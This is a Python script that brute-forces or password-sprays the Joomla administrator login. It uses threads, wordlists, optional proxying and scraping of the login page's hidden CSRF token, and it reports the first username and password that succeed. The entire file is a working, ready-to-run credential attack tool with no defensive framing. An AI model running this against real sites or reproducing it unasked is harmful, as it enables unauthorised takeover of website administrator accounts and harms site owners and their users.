#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse
import tqdm 
import threading
from concurrent.futures import ThreadPoolExecutor
import typing


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Joomla():

    def __init__(self):
        self.initializeVariables()
        self.sendrequest()

    def initializeVariables(self):
        #Initialize args
        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
        #required
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
        parser.add_argument('-w', '--wordlist', required=True, type=argparse.FileType('rb'), help='Path to wordlist file')

        #optional
        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
        parser.add_argument('-t', '--threads', type=int, default=8, help='Number of threads.')
        #these two arguments should not be together
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='One single username')
        group.add_argument('-U', '--userlist', type=argparse.FileType('rb'), help='Username list')

        args = parser.parse_args()

        #parse args and save proxy
        if args.proxy:
            parsedproxyurl = urlparse(args.proxy)
            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
        else:
            self.proxy=None

        #determine if verbose or not
        if args.verbose:
            self.verbose=True
        else:
            self.verbose=False

        #http:/site/administrator
        self.url = args.url+'/administrator/'
        self.ret = 'aW5kZXgucGhw'
        self.option='com_login'
        self.task='login'
        #Wordlist from args
        self.passwords = self.getdata(args.wordlist)
        self.passwords_count = len(self.passwords)
        if args.userlist:
            self.usernames = self.getdata(args.userlist)
            self.usernames_count = len(self.usernames)
        else:
            self.usernames = (args.username,)
            self.usernames_count = 1
        self.threads = args.threads
        self.finished = threading.Event()
   

    def sendrequest(self):
        with tqdm.tqdm(total=self.passwords_count * self.usernames_count, mininterval=2) as pbar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                if self.passwords_count < self.usernames_count: # password spraying
                    futures = [executor.submit(self.doGET, w, self.passwords, pbar) for w in self.chunks(self.usernames, self.threads)]
                else: # password brute force
                    futures = [executor.submit(self.doGET, self.usernames, w, pbar) for w in self.chunks(self.passwords, self.threads)]
            # wait for all threads to finish        
            for future in futures:
                future.result()
            # get progress bar to 100%
            pbar.update(pbar.total - pbar.n)


    def doGET(self, usernames: list, passwords: list, pbar: tqdm.tqdm):
        #Need cookie
        local_cookies = requests.session().get(self.url).cookies.get_dict()
        for username in usernames:
            for password in passwords:
                if self.finished.is_set():
                    return
                #Custom user-agent :)
                headers = {
                    'User-Agent': 'nano'
                }

                #First GET for CSSRF
                r = requests.get(self.url, proxies=self.proxy, cookies=local_cookies, headers=headers)
                soup = BeautifulSoup(r.text, 'html.parser')
                longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
                password=password.decode('utf-8')

                data = {
                    'username' : username,
                    'passwd' : password,
                    'option' : self.option,
                    'task' : self.task,
                    'return' : self.ret,
                    longstring : 1
                }
                r = requests.post(self.url, data = data, proxies=self.proxy, cookies=local_cookies, headers=headers)
                soup = BeautifulSoup(r.text, 'html.parser')
                response = soup.find('div', {'class': 'alert-message'})
                
                pbar.update()
                
                if response:
                    if self.verbose:
                        pbar.write(f'{bcolors.FAIL} {username}:{password}{bcolors.ENDC}')
                else:
                    pbar.write(f'{bcolors.OKGREEN} {username}:{password}{bcolors.ENDC}')
                    self.finished.set()
                    return


    @staticmethod
    def getdata(file):
        return tuple(line.rstrip() for line in file)


    @staticmethod
    def chunks(l: typing.Iterable, n: int):
        """Yield n number of striped chunks from l."""
        for i in range(0, n):
            yield l[i::n]

joomla = Joomla()
